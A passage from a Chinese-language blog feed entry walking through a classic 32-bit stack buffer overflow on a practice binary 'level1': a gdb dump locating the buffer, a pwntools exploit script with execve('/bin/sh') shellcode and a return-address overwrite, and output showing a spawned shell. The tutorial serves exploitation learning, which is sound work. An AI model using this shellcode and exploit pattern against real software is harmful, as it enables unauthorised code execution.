(gdb) x/s $esp-144
0xffffcf10:	'a' &amp;lt;repeats 140 times&amp;gt;, &quot;bbbb\n\317\377\377&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;此时已经得到了&lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;的地址&lt;code class=&quot;highlighter-rouge&quot;&gt;0xffffcf10&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;step5编写exploit&quot;&gt;step5:编写exploit&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat exp.py
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./level1')
ret =  0xffffcf10

shellcode  = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

payload = shellcode + 'A'*(140-len(shellcode)) + p32(ret)

p.send(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;step6执行结果&quot;&gt;step6:执行结果&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python exp1.py
[+] Starting local process './level1': pid 16267
[*] Switching to interactive mode
$ whoami
owl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Triangleowl</name></author><summary type="html">源代码如下:</summary></entry></feed>